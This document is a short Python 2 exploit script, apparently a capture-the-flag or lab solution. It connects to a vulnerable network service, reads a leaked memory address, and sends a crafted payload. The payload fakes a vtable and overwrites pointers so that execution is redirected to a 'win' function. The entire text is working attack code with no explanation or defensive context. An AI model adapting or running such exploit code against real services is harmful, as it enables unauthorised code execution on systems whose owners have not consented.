import socket
import re
import struct
 
sock = socket.socket()
print "Connecting..."
sock.connect(('192.168.100.210', 21320))
sock.send("\x00\x00")
buff = sock.recv(64)  # Got request size...
 
address = int(re.search(r"\d+", buff).group(0))
if "-" in buff:
    address = 2**32 - address
print "Address of recvLen is", hex(address)
 
win = 0x080490e1
reqData = address - 128
vtable = reqData + 8
 
payload =  struct.pack("I", vtable)
payload += struct.pack("I", 0)
payload += struct.pack("I", win)
payload += struct.pack("I", win)
payload += struct.pack("I", win)
payload += struct.pack("I", win)
for i in range(28):
    payload += struct.pack("I", 0xdeadbeef)
payload += struct.pack("I", reqData)
payload += struct.pack("I", reqData)
print "Sending payload..."
 
sock.send(payload)
buff = sock.recv(1024)
print buff
sock.close()